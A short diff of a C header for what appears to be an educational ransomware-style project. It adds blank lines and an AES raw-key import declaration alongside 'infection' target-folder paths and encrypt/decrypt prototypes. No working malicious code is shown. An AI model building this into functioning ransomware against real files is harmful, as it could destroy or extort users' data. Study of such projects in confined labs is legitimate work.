@@ -30,7 +30,9 @@ typedef struct s_windows
 # define DC_TARGET_PATHS        { "D:\\Documents\\infection" } // No '\' at the end
 
 extern t_windows win_env;
+
 # else
+
 # include <unistd.h>
 # define DC_TARGET_PATHS        { "~/infection" } // No '/' at the end
 #endif
@@ -143,6 +145,7 @@ int     aes_encrypt_data(unsigned char *data, DWORD data_len, \
 int     aes_decrypt_data(unsigned char *data, DWORD data_len, \
     HCRYPTKEY key, unsigned char *iv);
 HCRYPTKEY   generate_encryption_key(void);
+HCRYPTKEY   import_raw_aes_key(HCRYPTPROV hProv, BYTE *raw_key, DWORD key_len);
 # else
 int     aes_encrypt_data(unsigned char *data, size_t data_len, \
     const unsigned char *key, unsigned char *iv);
